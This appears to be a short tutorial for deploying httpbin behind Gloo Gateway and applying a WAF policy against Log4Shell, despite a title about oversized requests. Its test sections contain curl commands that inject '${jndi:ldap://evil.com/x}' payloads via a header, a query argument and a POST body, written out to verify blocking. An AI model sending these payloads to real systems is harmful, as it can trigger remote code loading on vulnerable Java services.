# The Elephant (Payload) in the Room: Handling Super-Sized Requests with Gloo Gateway


## Deploy httpbin

```sh
kubectl create namespace httpbin --context gloo
kubectl --context gloo label namespace httpbin istio-injection=enabled

kubectl apply -f log4shell/httpbin.yaml -n httpbin --context gloo
```

## Gloo Mesh Config


https://www.solo.io/blog/handling-super-sized-requests-with-gloo-edge/

```sh
kubectl apply -f log4shell/workspace.yaml --context gloo
kubectl apply -f log4shell/virtual-gateway.yaml --context gloo
kubectl apply -f log4shell/route-table.yaml --context gloo
```


## Test bad call

```sh
curl -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" localhost:8080/anything -i
```


## Apply Policy

```sh
kubectl apply -f log4shell/waf-policy.yaml --context gloo
```

```sh
# Request Header Attacks
curl -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" localhost:8080/anything -i
# Request Argument Attacks
curl -X GET localhost:8080/anything\?arg-1=\$\\{jndi:ldap://evil.com/x\\} -i
# Request Payload Attacks
curl -X POST -d "arg-1=\${jndi:ldap://evil.com/x}" localhost:8080/anything -i
```
